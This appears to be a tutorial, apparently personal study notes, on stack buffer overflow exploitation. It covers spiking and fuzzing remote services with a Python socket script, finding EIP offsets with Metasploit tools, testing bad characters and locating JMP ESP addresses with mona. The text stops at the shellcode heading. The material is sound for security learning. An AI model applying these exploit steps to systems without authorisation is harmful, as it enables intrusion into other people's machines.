Buffer Overflows
================


## Overview

Buffer Overflows are a type of binary exploitation which arise from poor programing practices && memory allocation in memory managed programing languages like C. They are an example for a 'mixing data && control' vulnrability.

## Occurance

Buffer Overflow vectors/vulnrabilities commonly arise when:

- User data is collected with an unprotected function like `gets()`
- A function or section of code within a program assumes a prameter or variable is of suitible length for the allocated memory
- A length/buffer check is bypassed 


# Theory

## Memory for Buffer Overflows

### Anatomy of Memory

![Memory Diagram](images/MemoryDiagram.png "Memory Diagram")

### Anatomy of the Stack

~ Note diagram assumes little-endian addressing

![Stack Diagram](images/StackDiagram.png "Stack Diagram")


## Executing a Buffer Overflow

### Objectives

#### Broad objectives:

+ Inject input into a vulnerable program such that the buffer space allocated for the input is overwritten
+ Overflow the EBP and reach the EIP by varying the injected string
+ Overwrite the EIP with the memory location of arbitary code to achieve arbitary code execution


### Approach

#### General Steps to pop a shell:

~ Changes based on objective 

1. Spiking
2. Fuzzing
3. Find the Offset
4. Overwriting the EIP
5. Finding bad characters
6. Finding the right module
7. Generating shellcode
8. Obtain shell


# Tooling

## Linux

### GDB

Command line debugger for linux. Should be installed by default. Install:

`sudo apt-get install gdb`

## Windows

### Imunity Debugger

GUI based debugger for windows. Download the executable here

# Locating

## Spiking

+ Spiking is the process of looking for input vectors that may facilitate a buffer oveflow attack
+ Best optimised with scripts
+ Typically done on remote targets where the binary can't be decompiled

### Using 'generic send tcp'

Generic send tcp is a spiking/fuzzing tool for remote targets.

#### Usage

`generic_send_tcp (host) (port) (spike_script.spk) (SKIPVAR) (SKIPSTR)`

`generic_send_tcp 192.168.0.100 701 login.spk 0 0`

#### Spike Script

```
//Example spike script

s_readline(); //Read standard out (after connect)
s_string("Relevant Server Command to Test "); //Send string to remote prompt
s_string_variable("Argument To Fuzz"); //Send a arbitary argument that will be used to fuzz for vulnerabilities 
```

## Fuzzing

+ Fuzzing is used to determine at which input byte size (input string length) a program crashes/segmentation faults
+ Knowing this length is important to crafting exploits for the return pointer/EIP to 'execute'

### Simple Python Remote Target Fuzzer

Simple remote server fuzzer template, useful for finding the byte size at which a remote buffer overflows:

```
import sys, socket
from time import sleep

current_buffer = "A" * 100  # Arbitary inital buffer length --> Should be adapted on a scenario basis
target_ip = '192.168.0.0'  # Place holder host/target/remote server IP address
target_port = 9999  # Place holder host/target/remote server port number


while True:

	try:

		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect(('{target_ip}', target_port))  # Form socket connection to remote server

		sock.send(('RELEVANT SERVER COMMAND' + current_buffer))  # Add current test buffer size as an argument to fuzz desired command
		sock.close()
		sleep(1)  # Reduce load on remote server

		current_buffer = current_buffer + "A" * 100  # Index the buffer by another arbitary ammount

	except: 

		print("Fuzzing crashed at {} bytes".format(len(current_buffer)))
		sys.exit()

```

~ Note this script can also be found seperately under the `scripts/` directory


# Exploiting

## Locating Offsets

+ Locating the offset is about looking for the exact byte size (input string) which overwrites the EIP

### Using 'Pattern Create'

#### Overview:

+ Creates a string of no repeating values the length of the input bytes (`-l byte size`)
+ This string can then be injected into a program
+ With GDB, Imunity debugger or another debugger we can observe the string that has overwritten the EIP
+ This string can then be passed as an argument to another metasploit module to produce the exact byte length required to reach the EIP

#### Command:

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (byte_length_of_buffer-overflow)`

#### Usage:

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000`

### Using 'Pattern Offset'

#### Overview:

+ Used after generating a pattern which when injected overwrites the EIP with a portion of the pattern
+ Matches the EIP pattern string in the original pattern to determine the number of bytes away from the begining
+ Yeilds a offset byte value from which a payload can be crafted for the EIP to execute

#### Command:

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l (byte_length_of_pattern) -q (EIP_string_pattern)`

#### Usage:

`/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q 386F4337`


## Overwrting the EIP

+ Overwriting the EIP involves writing specific bytes over the return pointer (EIP) which will execute some action desired by the attacker 

### Checking Controll of the EIP

+ To check that the EIP can be overwritten and that the offset is correct a recognisable string can be added after the determined offset and the result observed in a debugger
+ If the EIP in the debugger holds the hex/ASCII value of the appended string then the EIP can be controlled

### Example:

+ The offset is 2003 bytes
+ Append some number of bytes equal or longer then the EIP `A * offset + "B" * 4`
+ If the EIP holds the hex/ASCII value of the appended string then the EIP can be controlled/overwritten as desired 
	+ `B = 41w` expect `EIP: 41414141` 

## Finding Bad Characters

+ Bad characters or 'badchars' are characters may be stripped or perform some predetermined function in a program
+ As a result those chars are 'bad' because they cannot be used to craft a payload (i.e generate shellcode)
+ Therfore such characters must be detected and eliminated from any payload which is crafted
+ Common badchars can be injected into the program in order to test if they will cause undesired function

### Badchars

+ Appended after the offset and EIP overwrite
+ Check the hexdump for any missing && out of place characters from the injection
+ Injected charcters missing in the debugger hexdump indicate bad characters  

#### Common Bad Chars

```

"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

```

~ See `scripts/` for a simple badchar tester script

## Determining Sutible Return Pointer Addresses

+ In order to have the return pointer (EIP) point to arbitary attacker code an attacker needs to locate a suitible area in memory to place the payload
+ The memory location needs to be accessible by the program that is being attacked 
+ One way to achive these requirments is to find a moudle (dll, libary) that the program uses/is attatched to, whose memory location is not protected (SafeSEH, ASLR)
+ The attacker can then overwrite this area in memory with arbitary code and point the EIP (return pointer), using a JMP opcode,
to the modules address
+ The attacker must also find an appropriate return address of the overwritten module for the `JMP ESP` opcode to point to


### Determining OPCODES

#### Command:

`/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`

#### Usage:

`nasm > (ASSEMBLY_INSTRUCTION)`

#### Example:

+ Find `JMP ESP` OPCODE

`nasm> jmp esp`


### Using Imunity Debugger 

+ Sutible ddls (dynamic link libaries) can be located using a module for Imunity

#### Mona Module

##### Install:

+ Installed from [here](https://github.com/corelan/mona)

##### Usage:

`!mona modules`

#### Find Moudle Return Address

`!mona find -s "\xff\xe4" -m (dll_name.dll)`

~ `\xff\xe4` is the opcode for jmp esp

### Appending Return Address

+ Once a sutible return address is obtained it can be appended to the end of the offset to overwrite the EIP
+ Depedning on the architecture that the program is running on the return address may be written in two ways
+ Little-endian is the dominate addressing system

### Little-endian

Example Address: `625011af`

`offset + "\xaf\x11\x50\x62"`

### Big-endian

Example Address: `625011af`

'offset + "\x62\x50\x11\xaf"'

## Generating Shellcode

